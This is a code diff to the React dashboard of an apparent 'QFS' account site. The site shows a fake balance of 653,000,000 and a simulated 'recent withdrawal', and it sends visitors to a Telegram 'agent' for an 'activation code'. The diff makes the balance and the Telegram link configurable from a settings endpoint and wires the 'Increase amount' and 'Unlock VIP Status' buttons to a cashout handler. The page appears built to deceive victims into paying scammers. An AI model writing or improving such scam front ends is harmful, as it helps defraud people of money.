@@ -29,8 +29,26 @@ export default function Dashboard() {
     const [isVerifying, setIsVerifying] = useState(false);
     const [errorCode, setErrorCode] = useState("");
     const [activationSuccess, setActivationSuccess] = useState(false);
+    const [balance, setBalance] = useState("653,000,000");
+    const [telegramLink, setTelegramLink] = useState("https://t.me/qfscommunity");
 
     useEffect(() => {
+        // Fetch default balance and telegram link from settings
+        const fetchSettings = async () => {
+            try {
+                const res = await fetch("/api/public/settings");
+                const data = await res.json();
+                if (data.success) {
+                    if (data.balance) setBalance(data.balance);
+                    if (data.telegramLink) setTelegramLink(data.telegramLink);
+                }
+            } catch (error) {
+                console.error("Failed to fetch settings", error);
+            }
+        };
+
+        fetchSettings();
+
         // Check if already activated
         const isActivated = localStorage.getItem("qfs_account_activated") === "true";
         if (isActivated) {
@@ -86,7 +104,6 @@ export default function Dashboard() {
     };
 
     // Simulated data based on design
-    const balance = "653,000,000";
     const recentWithdrawal = {
         name: "Daniel Cooper",
         amount: "454,000,000",
@@ -175,7 +192,10 @@ export default function Dashboard() {
                                 >
                                     Cash out <span className="bg-black/10 rounded-full p-1"><LogOut className="w-4 h-4" /></span>
                                 </button>
-                                <button className="bg-[#1E293B]/80 hover:bg-[#2E394B] transition-all border border-white/10 font-black px-5 py-3.5 sm:px-8 sm:py-4 rounded-xl flex items-center justify-center gap-2 uppercase text-xs sm:text-sm active:scale-95">
+                                <button 
+                                  onClick={handleCashoutClick}
+                                  className="bg-[#1E293B]/80 hover:bg-[#2E394B] transition-all border border-white/10 font-black px-5 py-3.5 sm:px-8 sm:py-4 rounded-xl flex items-center justify-center gap-2 uppercase text-xs sm:text-sm active:scale-95"
+                                >
                                     Increase amount <TrendingUp className="w-4 h-4" />
                                 </button>
                             </div>
@@ -216,7 +236,10 @@ export default function Dashboard() {
                                 <div className="text-white text-xl sm:text-2xl md:text-3xl font-black tracking-tighter">$*****</div>
                             </div>
                         </div>
-                        <button className="bg-[#EAB308] hover:bg-[#FACC15] text-black font-black py-3.5 sm:py-4 rounded-xl w-full hover:shadow-[0_0_20px_rgba(234,179,8,0.3)] transition-all uppercase text-xs sm:text-sm tracking-tight active:scale-95">
+                        <button 
+                          onClick={handleCashoutClick}
+                          className="bg-[#EAB308] hover:bg-[#FACC15] text-black font-black py-3.5 sm:py-4 rounded-xl w-full hover:shadow-[0_0_20px_rgba(234,179,8,0.3)] transition-all uppercase text-xs sm:text-sm tracking-tight active:scale-95"
+                        >
                             Unlock VIP Status
                         </button>
                     </div>
@@ -363,8 +386,8 @@ export default function Dashboard() {
                                 {!activationSuccess && (
                                   <p className="text-slate-400 text-[11px] sm:text-xs md:text-sm font-medium">
                                     Contact Agent For QFS Activation Code{" "}
-                                    <a href="https://t.me/Tesla_class_X_1" target="_blank" rel="noopener noreferrer" className="text-[#EAB308] hover:underline uppercase font-bold whitespace-nowrap">
-                                      @Tesla_class_X_1
+                                    <a href={telegramLink} target="_blank" rel="noopener noreferrer" className="text-[#EAB308] hover:underline uppercase font-bold whitespace-nowrap">
+                                      Telegram
                                     </a>
                                   </p>
                                 )}
@@ -393,7 +416,7 @@ export default function Dashboard() {
 
                                   <div className="flex flex-row gap-3">
                                       <a 
-                                        href="https://t.me/Tesla_class_X_1" 
+                                        href={telegramLink} 
                                         target="_blank" 
                                         rel="noopener noreferrer"
                                         className="flex-1 bg-[#1E293B] hover:bg-[#2E394B] transition-colors text-white font-black py-3.5 rounded-xl flex items-center justify-center gap-2 uppercase text-[11px] sm:text-xs"
@@ -472,7 +495,7 @@ export default function Dashboard() {
                                 </div>
 
                                 <a 
-                                  href="https://t.me/Tesla_class_X_1" 
+                                  href={telegramLink} 
                                   target="_blank" 
                                   rel="noopener noreferrer"
                                   className="w-full bg-[#EAB308] hover:bg-[#FACC15] text-black font-black py-3.5 sm:py-4 rounded-xl uppercase text-xs sm:text-sm tracking-tight transition-colors shadow-lg active:scale-95"
